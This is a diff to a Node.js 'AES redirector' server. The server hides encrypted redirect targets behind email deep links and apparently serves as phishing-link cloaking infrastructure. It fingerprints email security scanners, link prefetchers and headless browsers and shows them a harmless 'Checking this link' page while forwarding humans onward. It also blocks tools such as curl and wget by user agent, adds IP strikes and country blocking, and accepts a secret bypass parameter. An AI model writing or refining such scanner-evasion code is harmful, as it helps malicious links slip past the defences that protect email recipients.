@@ -1,4 +1,4 @@
-// server.js — AES redirector + Cloudflare Turnstile, hardened (v4.8 Advance Beta Widget Improved)
+// server.js — AES redirector + Cloudflare Turnstile, hardened (v4.9 Advance Beta widget + Interstitial improved)
 require("dotenv").config();
 const express = require("express");
 const crypto = require("crypto");
@@ -670,33 +670,79 @@ if (DEBUG_SHOW_KEYS_ON_START) {
 }
 
 // ================== CHALLENGE TOKEN FUNCTIONS ==================
-function createChallengeToken(nextEnc) {
+function hashIpForToken(ip) {
+  try {
+    return crypto.createHash("sha256")
+      .update(String(ip || ""))
+      .digest("base64")
+      .slice(0, 16);
+  } catch {
+    return "";
+  }
+}
+
+function hashUaForToken(ua) {
+  try {
+    return crypto.createHash("sha256")
+      .update(String(ua || ""))
+      .digest("base64")
+      .slice(0, 16);
+  } catch {
+    return "";
+  }
+}
+
+function createChallengeToken(nextEnc, req) {
   const raw = parseInt(process.env.CHALLENGE_TOKEN_TTL_MIN || "10", 10);
   const ttlMin = Number.isFinite(raw) && raw > 0 ? raw : 10; // guard
   const exp = Date.now() + ttlMin * 60 * 1000;
 
-  const payload = { next: nextEnc, exp, ts: Date.now() };
-  const token = Buffer.from(JSON.stringify(payload)).toString('base64url');
-  const sig = crypto.createHmac('sha256', process.env.ADMIN_TOKEN)
-                    .update(token).digest('base64url');
+  const ip = getClientIp(req);
+  const ua = req && req.get ? (req.get("user-agent") || "") : "";
+
+  const payload = {
+    next: nextEnc,
+    exp,
+    ts: Date.now(),
+    ih: hashIpForToken(ip),
+    uh: hashUaForToken(ua)
+  };
+  const token = Buffer.from(JSON.stringify(payload)).toString("base64url");
+  const sig = crypto
+    .createHmac("sha256", process.env.ADMIN_TOKEN)
+    .update(token)
+    .digest("base64url");
   return `${token}.${sig}`;
 }
 
-function verifyChallengeToken(challengeToken) {
-  if (!challengeToken || typeof challengeToken !== 'string') return null;
-  
-  const parts = challengeToken.split('.');
+function verifyChallengeToken(challengeToken, req) {
+  if (!challengeToken || typeof challengeToken !== "string") return null;
+
+  const parts = challengeToken.split(".");
   if (parts.length !== 2) return null;
-  
+
   const [token, sig] = parts;
-  
-  const expectedSig = crypto.createHmac('sha256', process.env.ADMIN_TOKEN)
-                          .update(token).digest('base64url');
+
+  const expectedSig = crypto
+    .createHmac("sha256", process.env.ADMIN_TOKEN)
+    .update(token)
+    .digest("base64url");
   if (sig !== expectedSig) return null;
-  
+
   try {
-    const payload = JSON.parse(Buffer.from(token, 'base64url').toString());
+    const payload = JSON.parse(Buffer.from(token, "base64url").toString());
     if (Date.now() > payload.exp) return null;
+
+    if (payload.ih || payload.uh) {
+      const ip = getClientIp(req);
+      const ua = req && req.get ? (req.get("user-agent") || "") : "";
+      const ihNow = hashIpForToken(ip);
+      const uhNow = hashUaForToken(ua);
+      if ((payload.ih && payload.ih !== ihNow) || (payload.uh && payload.uh !== uhNow)) {
+        return null;
+      }
+    }
+
     return payload;
   } catch (e) {
     return null;
@@ -1140,36 +1186,47 @@ function computeScannerStatsFromLogs() {
   const byUA = Object.create(null);
   let total = 0;
 
-  const lines = Array.isArray(LOGS) ? LOGS : [];
-  for (const line of lines) {
-    if (!line || typeof line !== 'string') continue;
+  const logLines = Array.isArray(LOGS) ? LOGS : [];
+  for (const line of logLines) {
+    if (!line || typeof line !== "string") continue;
+    if (!line.includes("[SCANNER] 200 interstitial")) continue;
 
-    if (line.includes("[SCANNER] 200 interstitial")) {
-      total += 1;
+    total += 1;
 
-      let reason = "unknown";
-      const rPos = line.indexOf(" reason=");
-      if (rPos >= 0) {
-        let tail = line.slice(rPos + 8);
-        const nPos = tail.indexOf(" nextLen=");
-        if (nPos >= 0) tail = tail.slice(0, nPos);
-        reason = tail.trim().replace(/_/g, " ");
-      }
-      try { reason = decodeURIComponent(reason.replace(/\+/g, " ")); } catch {}
-
-      let uaKey = "(empty)";
-      try {
-        const mU = /ua="([^"]{0,200})"/.exec(line);
-        const ua = (mU && mU[1]) ? mU[1] : "(empty)";
-        uaKey = (ua.split(/[;\s]/)[0] || "(empty)").toLowerCase();
-      } catch {}
-
-      byReason[reason] = (byReason[reason] || 0) + 1;
-      byUA[uaKey] = (byUA[uaKey] || 0) + 1;
+    let reason = "unknown";
+    const rPos = line.indexOf(" reason=");
+    if (rPos >= 0) {
+      let tail = line.slice(rPos + 8);
+      const nPos = tail.indexOf(" nextLen=");
+      if (nPos >= 0) tail = tail.slice(0, nPos);
+      reason = tail.trim() || "unknown";
     }
+    byReason[reason] = (byReason[reason] || 0) + 1;
+
+    let uaKey = "(empty)";
+    const uPos = line.indexOf(" uaKey=");
+    if (uPos >= 0) {
+      let tail = line.slice(uPos + 7);
+      const sp = tail.indexOf(" ");
+      if (sp >= 0) tail = tail.slice(0, sp);
+      uaKey = tail.trim() || "(empty)";
+    }
+    byUA[uaKey] = (byUA[uaKey] || 0) + 1;
   }
 
-  return { total, byReason, byUA };
+  SCANNER_STATS.total = total;
+  SCANNER_STATS.byReason = byReason;
+  SCANNER_STATS.byUA = byUA;
+  return SCANNER_STATS;
+}
+
+function hashUAForStats(uaRaw) {
+  try {
+    const ua = (uaRaw || "").toString();
+    return crypto.createHash("sha256").update(ua).digest("hex").slice(0, 8);
+  } catch {
+    return "na";
+  }
 }
 
 function logScannerHit(req, reason, nextEnc) {
@@ -1184,17 +1241,32 @@ function logScannerHit(req, reason, nextEnc) {
   const uaKey = ua.toLowerCase().split(/[;\s]/)[0] || "(empty)";
   SCANNER_STATS.byUA[uaKey] = (SCANNER_STATS.byUA[uaKey] || 0) + 1;
 
-  addLog(`[SCANNER] 200 interstitial ip=${safeLogValue(ip)} ua="${safeLogValue(ua)}" path="${safeLogValue(path)}" accept="${safeLogValue(acc)}" referer="${safeLogValue(ref)}" reason=${safeLogValue(reason)} nextLen=${(nextEnc||"").length}`);
+  const uaHash = hashUAForStats(ua);
+  const geo = "-";
+  const asn = "-";
+
+  addLog(
+    `[SCANNER] 200 interstitial ip=${safeLogValue(ip)} geo=${safeLogValue(geo)} asn=${safeLogValue(
+      asn
+    )} uaKey=${safeLogValue(uaKey)} uaHash=${safeLogValue(uaHash)} path=${safeLogValue(
+      path
+    )} ref=${safeLogValue(ref)} accept=${safeLogValue(acc)} reason=${safeLogValue(
+      reason
+    )} nextLen=${(nextEnc || "").length}`
+  );
   addSpacer();
 }
 
-// ================== HEADLESS DETECTION ==================
-const UA_HEADLESS_MARKS = [ 
+// ================== HEADLESS / PREFETCH DETECTION ==================
+const UA_HEADLESS_MARKS = [
   "headless","puppeteer","playwright","phantomjs","selenium","wdio","cypress",
   "curl","wget","python-requests","httpclient","okhttp","java","go-http-client",
   "libwww","aiohttp","node-fetch","powershell"
 ];
-const SUSPICIOUS_HEADERS = ["x-puppeteer","x-headless-browser","x-should-not-exist","x-playwright","x-automation","x-bot"];
+const SUSPICIOUS_HEADERS = [
+  "x-puppeteer","x-headless-browser","x-headless","x-should-not-exist",
+  "x-playwright","x-automation","x-bot"
+];
 
 function headlessSuspicion(req){
   const reasons = [];
@@ -1214,26 +1286,41 @@ function headlessSuspicion(req){
   };
 
   for (const m of UA_HEADLESS_MARKS) {
-    if (ua.includes(m)) { reasons.push("ua:"+m); hard.push("ua:"+m); break; }
+    if (ua.includes(m)) { reasons.push("ua:" + m); hard.push("ua:" + m); break; }
   }
   for (const h of SUSPICIOUS_HEADERS) {
-    if (req.headers[h]) { reasons.push("hdr:"+h); hard.push("hdr:"+h); }
+    if (req.headers[h]) { reasons.push("hdr:" + h); hard.push("hdr:" + h); }
   }
 
   if (!req.get("accept-language")) { reasons.push("missing:accept-language"); soft.push("missing:accept-language"); }
 
-  if (expect.clientHints && !req.get("sec-ch-ua"))       { reasons.push("missing:sec-ch-ua");       soft.push("missing:sec-ch-ua"); }
-  if (expect.fetchMeta   && !req.get("sec-fetch-site"))   { reasons.push("missing:sec-fetch-site");  soft.push("missing:sec-fetch-site"); }
+  if (expect.clientHints && !req.get("sec-ch-ua")) {
+    reasons.push("missing:sec-ch-ua"); soft.push("missing:sec-ch-ua");
+  }
+  if (expect.fetchMeta && !req.get("sec-fetch-site")) {
+    reasons.push("missing:sec-fetch-site"); soft.push("missing:sec-fetch-site");
+  }
+
+  const fetchSite = (req.get("sec-fetch-site") || "").toLowerCase();
+  const fetchMode = (req.get("sec-fetch-mode") || "").toLowerCase();
+  const fetchDest = (req.get("sec-fetch-dest") || "").toLowerCase();
+
+  if (fetchMode && fetchMode !== "navigate" && fetchMode !== "document") {
+    reasons.push("mode:" + fetchMode); soft.push("mode:" + fetchMode);
+  }
+  if (fetchDest && fetchDest !== "document" && fetchDest !== "empty") {
+    reasons.push("dest:" + fetchDest); soft.push("dest:" + fetchDest);
+  }
 
   const accept = req.get("accept") || "";
   if (accept && !/text\/html|application\/xhtml\+xml/i.test(accept)) {
     reasons.push("accept-not-html"); hard.push("accept-not-html");
   }
 
-  return { 
-    suspicious: reasons.length > 0, 
-    reasons, 
-    hardCount: hard.length, 
+  return {
+    suspicious: reasons.length > 0,
+    reasons,
+    hardCount: hard.length,
     softCount: soft.length,
     isSafariUA,
     isFirefoxUA,
@@ -1322,51 +1409,193 @@ const limitChallenge   = makeIpLimiter({ capacity: parseInt(process.env.CHALLENG
 const limitTsClientLog = makeIpLimiter({ capacity: parseInt(process.env.TSLOG_CAPACITY || "30",10),      windowSec: parseInt(process.env.TSLOG_WINDOW_SEC || "300",10),      keyPrefix: "tslog" });
 const limitSseUnauth   = makeIpLimiter({ capacity: parseInt(process.env.SSE_UNAUTH_CAPACITY || "10",10), windowSec: parseInt(process.env.SSE_UNAUTH_WINDOW_SEC || "60",10),  keyPrefix: "sse_unauth" });
 
-// ================== CORE REDIRECT LOGIC ==================
-function renderScannerSafePage(res, nextEnc, reason = "Pre-scan") {
-  const challengeToken = createChallengeToken(nextEnc);
+// ================== CORE REDIRECT / INTERSTITIAL HELPERS ==================
+const INTERSTITIAL_REASON_TEXT = {
+  "Pre-scan": "Pre-scan",
+  "Email-safe path": "Email-safe path",
+  "HEAD-probe": "HEAD probe",
+  "GET-probe": "GET probe",
+  "OPTIONS-probe": "OPTIONS probe",
+  "Known scanner UA": "Known scanner user agent"
+};
+
+function mapInterstitialReason(reason) {
+  if (!reason) return "Pre-scan";
+  const key = String(reason);
+  return INTERSTITIAL_REASON_TEXT[key] || key;
+}
+
+const INTERSTITIAL_STATE = new Map();
+const INTERSTITIAL_TTL_MS = 60 * 60 * 1000; // 1 hour
+const INTERSTITIAL_MAX_ENTRIES = 10000;
+
+function pruneInterstitialState(now) {
+  if (INTERSTITIAL_STATE.size <= INTERSTITIAL_MAX_ENTRIES) return;
+  const it = INTERSTITIAL_STATE.keys();
+  const firstKey = it.next().value;
+  if (firstKey) {
+    INTERSTITIAL_STATE.delete(firstKey);
+  }
+}
+
+function markInterstitialShown(nextEnc) {
+  const key = String(nextEnc || "");
+  const now = Date.now();
+  let entry = INTERSTITIAL_STATE.get(key);
+  const firstHit = !entry;
+  if (!entry) {
+    entry = { firstSeenAt: now, lastSeenAt: now, humanSeen: false };
+  } else {
+    entry.lastSeenAt = now;
+  }
+  INTERSTITIAL_STATE.set(key, entry);
+  pruneInterstitialState(now);
+  return { firstHit, humanSeen: !!entry.humanSeen };
+}
+
+function markInterstitialHuman(nextEnc) {
+  const key = String(nextEnc || "");
+  const now = Date.now();
+  let entry = INTERSTITIAL_STATE.get(key);
+  if (!entry) {
+    entry = { firstSeenAt: now, lastSeenAt: now, humanSeen: true };
+  } else {
+    entry.humanSeen = true;
+    entry.lastSeenAt = now;
+  }
+  INTERSTITIAL_STATE.set(key, entry);
+  pruneInterstitialState(now);
+  return entry;
+}
+
+const INTERSTITIAL_BYPASS_SECRET = process.env.INTERSTITIAL_BYPASS_SECRET || "";
+
+function hasInterstitialBypass(req) {
+  if (!INTERSTITIAL_BYPASS_SECRET) return false;
+  const q = req.query || {};
+  if (q && q.ib && q.ib === INTERSTITIAL_BYPASS_SECRET) return true;
+  const hdr = req.get("x-interstitial-bypass");
+  if (hdr && hdr === INTERSTITIAL_BYPASS_SECRET) return true;
+  return false;
+}
+
+function renderScannerSafePage(req, res, nextEnc, reason = "Pre-scan", options = {}) {
+  const mappedReason = mapInterstitialReason(reason);
+  const emailSafe = options.emailSafe === true || reason === "Email-safe path";
+  const allowAuto = options.allowAuto === true ? true : !emailSafe;
+
+  const stateInfo = markInterstitialShown(nextEnc);
+  const challengeToken = createChallengeToken(nextEnc, req);
+  const nonce = crypto.randomBytes(16).toString("base64");
+
   res.setHeader("Cache-Control", "no-store");
-  res.type("html").send(`<!doctype html><meta charset="utf-8">
+  try {
+    res.setHeader(
+      "Content-Security-Policy",
+      `default-src 'none'; script-src 'nonce-${nonce}'; style-src 'unsafe-inline'; base-uri 'none'; frame-ancestors 'none'; form-action 'self';`
+    );
+  } catch {}
+
+  const cfg = {
+    ct: challengeToken,
+    next: nextEnc,
+    allowAuto,
+    firstHit: !!stateInfo.firstHit,
+    humanSeen: !!stateInfo.humanSeen,
+    emailSafe: !!emailSafe
+  };
+  const cfgJson = JSON.stringify(cfg);
+
+  const html = `<!doctype html><html><head>
+<meta charset="utf-8">
 <title>Checking link…</title>
 <meta name="robots" content="noindex,nofollow">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+</head>
 <body style="font:16px system-ui;padding:24px;max-width:720px;margin:auto">
   <h1>Checking this link</h1>
-  <p>This link was pre-scanned by security software. If you're the recipient, click continue.</p>
-  <p><a href="/challenge?ct=${encodeURIComponent(challengeToken)}" rel="noopener">Continue</a></p>
-  <p style="color:#6b7280;font-size:14px">Reason: ${reason}</p>
-</body>`);
+  <p>This link was pre-scanned by security or preview software. If you're the intended recipient, click continue.</p>
+  <p><a id="continue-link" href="/challenge?ct=${encodeURIComponent(challengeToken)}" rel="noopener">Continue</a></p>
+  <p style="color:#6b7280;font-size:14px">Reason: ${mappedReason}</p>
+  <script nonce="${nonce}">
+    (function(){
+      var cfg = ${cfgJson};
+      try {
+        if (cfg && cfg.next) {
+          var payload = JSON.stringify({ next: cfg.next });
+          if (navigator.sendBeacon) {
+            var blob = new Blob([payload], { type: "application/json" });
+            navigator.sendBeacon("/interstitial-human", blob);
+          } else if (window.fetch) {
+            fetch("/interstitial-human", {
+              method: "POST",
+              headers: { "Content-Type": "application/json" },
+              body: payload,
+              keepalive: true
+            }).catch(function(){});
+          }
+        }
+      } catch (e) {}
+
+      if (!cfg.allowAuto) return;
+      if (cfg.firstHit || !cfg.humanSeen) return;
+
+      setTimeout(function(){
+        try {
+          if (document.visibilityState && document.visibilityState !== "visible") return;
+          window.location.href = "/challenge?ct=" + encodeURIComponent(cfg.ct);
+        } catch (e) {}
+      }, 1200);
+    })();
+  </script>
+</body>
+</html>`;
+
+  res.type("html").send(html);
 }
 
 // --- Early short-circuit for HEAD/OPTIONS scanner-style probes on deep links ---
 app.use((req, res, next) => {
+  if (hasInterstitialBypass(req)) return next();
+
   // allow your own health, logs, and challenge endpoints through
-if (
-  req.path === '/health' ||
-  req.path.startsWith('/view-log') ||
-  req.path.startsWith('/challenge') ||
-  req.path.startsWith('/ts-client-log')
-) {
-  return next();
-}
-
-  // only care about HEAD/OPTIONS prefetches (scanner probes)
-  if (req.method !== 'HEAD' && req.method !== 'OPTIONS') return next();
-
-  // If you treat email deep-links with /e/<payload>, short-circuit them
-  if (req.path.startsWith('/e/')) {
-    const clean = (req.originalUrl || '').slice(3).split('?')[0];
-    return renderScannerSafePage(res, clean, `${req.method}-probe`);
+  if (
+    req.path === "/health" ||
+    req.path.startsWith("/view-log") ||
+    req.path.startsWith("/challenge") ||
+    req.path.startsWith("/ts-client-log") ||
+    req.path.startsWith("/interstitial-human")
+  ) {
+    return next();
   }
 
-  // heuristic "deep" link detector: long base64-like path + no cookies
-  const looksDeep =
-    (req.originalUrl || '').length > 80 &&
-    /[A-Za-z0-9+/=_-]{40,}/.test(req.originalUrl || '') &&
-    !req.headers['cookie'];
+  // only care about HEAD/OPTIONS prefetches (scanner probes)
+  if (req.method !== "HEAD" && req.method !== "OPTIONS") return next();
+
+  // Handle /e/* specifically (email-safe deep links)
+  if (req.path.startsWith("/e/")) {
+    const clean = (req.originalUrl || "").slice(3).split("?")[0];
+    if (req.method === "HEAD") {
+      logScannerHit(req, "HEAD-probe", clean);
+      return res.status(200).type("html").end();
+    }
+    logScannerHit(req, req.method + "-probe", clean);
+    return renderScannerSafePage(req, res, clean, req.method + "-probe", { emailSafe: true });
+  }
+
+  const url = req.originalUrl || "";
+  const looksEncoded = /[A-Za-z0-9+/=_-]{40,}/.test(url);
+  const longPath = url.length > 80;
+  const hasCookies = !!req.headers["cookie"];
+  const fetchMode = (req.get("sec-fetch-mode") || "").toLowerCase();
+  const looksPrefetch = fetchMode && fetchMode !== "navigate" && fetchMode !== "document";
+
+  const looksDeep = longPath && looksEncoded && (!hasCookies || looksPrefetch);
 
   if (looksDeep) {
-    const clean = (req.originalUrl || '').replace(/^\//, '').split('?')[0];
-    return renderScannerSafePage(res, clean, `${req.method}-probe`);
+    const clean = url.replace(/^\//, "").split("?")[0];
+    logScannerHit(req, req.method + "-probe", clean);
+    return renderScannerSafePage(req, res, clean, req.method + "-probe");
   }
 
   return next();
@@ -1374,26 +1603,33 @@ if (
 
 // --- OPTIONAL: catch GET probes on /e/... and show the safe interstitial ---
 app.use((req, res, next) => {
+  if (hasInterstitialBypass(req)) return next();
+
   // Let your own endpoints through untouched
   if (
-    req.path === '/health' ||
-    req.path.startsWith('/view-log') ||
-    req.path.startsWith('/challenge') ||
-    req.path.startsWith('/ts-client-log')
-  ) return next();
-
-  if (req.method === 'GET' && req.path.startsWith('/e/')) {
-    const clean = (req.originalUrl || '').slice(3).split('?')[0];
-    return renderScannerSafePage(res, clean, 'GET-probe');
+    req.path === "/health" ||
+    req.path.startsWith("/view-log") ||
+    req.path.startsWith("/challenge") ||
+    req.path.startsWith("/ts-client-log") ||
+    req.path.startsWith("/interstitial-human")
+  ) {
+    return next();
   }
 
-  next();
+  if (req.method === "GET" && req.path.startsWith("/e/")) {
+    const clean = (req.originalUrl || "").slice(3).split("?")[0];
+    logScannerHit(req, "GET-probe", clean);
+    return renderScannerSafePage(req, res, clean, "GET-probe", { emailSafe: true });
+  }
+
+  return next();
 });
 
 function checkSecurityPolicies(req) {
   const ip = getClientIp(req);
   const ua = req.get("user-agent") || "";
-  
+  const bypassInterstitial = hasInterstitialBypass(req);
+
   if (isBanned(ip)) {
     addLog(`[BAN] blocked ip=${ip}`);
     addSpacer();
@@ -1401,28 +1637,38 @@ function checkSecurityPolicies(req) {
   }
 
   const scannerDetections = detectScannerEnhanced(req);
-  if (scannerDetections.length > 0) {
+  if (!bypassInterstitial && scannerDetections.length > 0) {
     const topDetection = scannerDetections[0];
-    addLog(`[SCANNER] interstitial ip=${ip} scanner="${topDetection.name}" confidence=${topDetection.confidence} ua="${ua.slice(0,UA_TRUNCATE_LENGTH)}"`);
+    addLog(
+      `[SCANNER] interstitial ip=${safeLogValue(ip)} scanner="${safeLogValue(
+        topDetection.name
+      )}" confidence=${safeLogValue(String(topDetection.confidence ?? ""))} ua="${safeLogValue(
+        ua.slice(0, UA_TRUNCATE_LENGTH)
+      )}"`
+    );
     return { blocked: true, interstitial: true, scanner: topDetection.name };
   }
 
   const BAD_UA = /(okhttp|python-requests|curl|wget|phantomjs)/i;
   if (BAD_UA.test(ua)) {
-    addLog(`[UA-BLOCK] ip=${ip} ua="${ua.slice(0,UA_TRUNCATE_LENGTH)}"`);
+    addLog(`[UA-BLOCK] ip=${ip} ua="${ua.slice(0, UA_TRUNCATE_LENGTH)}"`);
     addSpacer();
     return { blocked: true, status: 403, message: "Forbidden" };
   }
 
   const hs = headlessSuspicion(req);
-  if (hs.suspicious) {
-    const softOnlyOne = (hs.hardCount === 0 && hs.softCount === 1);
-    const label = (hs.hardCount >= 1)                         ? 'HEADLESS'
-                : ((hs.isSafariUA || hs.isFirefoxUA) && softOnlyOne) ? 'INFO'
-                : (hs.softCount >= 2)                          ? 'SUSPECT'
-                : 'INFO';
+  if (!bypassInterstitial && hs.suspicious) {
+    const softOnlyOne = hs.hardCount === 0 && hs.softCount === 1;
+    const label =
+      hs.hardCount >= 1
+        ? "HEADLESS"
+        : (hs.isSafariUA || hs.isFirefoxUA) && softOnlyOne
+        ? "INFO"
+        : hs.softCount >= 2
+        ? "SUSPECT"
+        : "INFO";
 
-    addLog(`[${label}] ip=${safeLogValue(ip)} reasons=${safeLogValue(hs.reasons.join(','))}`);
+    addLog(`[${label}] ip=${safeLogValue(ip)} reasons=${safeLogValue(hs.reasons.join(","))}`);
 
     if (hs.hardCount > 0) {
       addStrike(ip, HEADLESS_STRIKE_WEIGHT);
@@ -1437,7 +1683,7 @@ function checkSecurityPolicies(req) {
   }
 
   const ctry = getCountry(req);
-  const asn  = getASN(req);
+  const asn = getASN(req);
   if (countryBlocked(ctry)) {
     addLog(`[GEO] blocked country=${safeLogValue(ctry)} ip=${safeLogValue(ip)}`);
     addSpacer();
@@ -1576,7 +1822,7 @@ async function handleRedirectCore(req, res, baseString){
     if (securityCheck.interstitial) {
       const nextEnc = encodeURIComponent(baseString);
       logScannerHit(req, "Known scanner UA", nextEnc);
-      return renderScannerSafePage(res, nextEnc, "Known scanner UA");
+      return renderScannerSafePage(req, res, nextEnc, "Known scanner UA");
     }
     return res.status(securityCheck.status).send(securityCheck.message);
   }
@@ -1645,8 +1891,9 @@ app.use((req, res, next) => {
 });
 
 // Apply rate limiters BEFORE routes
-app.use("/challenge", limitChallenge);
-app.use("/ts-client-log", limitTsClientLog);
+app.use("/challenge",          limitChallenge);
+app.use("/ts-client-log",      limitTsClientLog);
+app.use("/interstitial-human", limitTsClientLog);
 app.use("/stream-log", (req, res, next) => {
   if (isAdminSSE(req)) return next();
   return limitSseUnauth(req, res, next);
@@ -1701,7 +1948,7 @@ app.post("/decrypt-challenge-data",
 app.get("/health", (_req, res) => res.json({ ok:true, time:new Date().toISOString() }));
 
 app.post(
-  "/ts-client-log",
+"/ts-client-log",
   express.text({ type: "*/*", limit: "64kb" }),
   (req, res) => {
     const ip  = getClientIp(req) || "unknown";
@@ -1743,6 +1990,29 @@ app.post(
     addLog(`[TS-CLIENT:${safeLogValue(payload.phase)}] ip=${safeLogValue(ip)} ua="${safeLogValue(ua)}" ${safeLogJson(payload)}`);
     addSpacer();
     res.status(204).end();
+  }
+);
+
+app.post(
+"/interstitial-human",
+  express.json({ type: "application/json", limit: "4kb" }),
+  (req, res) => {
+    const body = req.body || {};
+    const nextEnc = typeof body.next === "string" ? body.next.slice(0, 4096) : "";
+    if (!nextEnc) {
+      return res.status(400).json({ ok: false, error: "missing_next" });
+    }
+
+    markInterstitialHuman(nextEnc);
+
+    const ip = getClientIp(req) || "unknown";
+    const ua = (req.get("user-agent") || "").slice(0, UA_TRUNCATE_LENGTH);
+    addLog(
+      `[INTERSTITIAL-HUMAN] ip=${safeLogValue(ip)} ua="${safeLogValue(ua)}" nextLen=${nextEnc.length}`
+    );
+    addSpacer();
+
+    res.json({ ok: true });
   }
 );
 
@@ -2043,7 +2313,7 @@ app.get("/challenge", limitChallengeView, (req, res) => {
   let nextEnc = "";
   
   if (req.query.ct) {
-    const payload = verifyChallengeToken(String(req.query.ct));
+    const payload = verifyChallengeToken(String(req.query.ct), req);
     if (!payload) {
       addLog(`[CHALLENGE] Invalid or expired challenge token`);
       return res.status(400).send("Invalid or expired challenge link");
@@ -2510,7 +2780,7 @@ app.get("/e/:data(*)", (req, res) => {
   const clean = urlPathFull.split("?")[0];
   addLog(`[INTERSTITIAL] /e path used len=${clean.length}`);
   logScannerHit(req, "Email-safe path", clean);
-  return renderScannerSafePage(res, clean, "Email-safe path");
+  return renderScannerSafePage(req, res, clean, "Email-safe path", { emailSafe: true });
 });
 
 app.head("/e/:data(*)", (req, res) => {
@@ -2518,7 +2788,7 @@ app.head("/e/:data(*)", (req, res) => {
   const clean = urlPathFull.split("?")[0];
   addLog(`[INTERSTITIAL] HEAD /e path`);
   logScannerHit(req, "HEAD-probe", clean);
-  return renderScannerSafePage(res, clean, "HEAD-probe");
+  res.status(200).type("html").end();
 });
 
 app.get("/r", async (req, res) => {
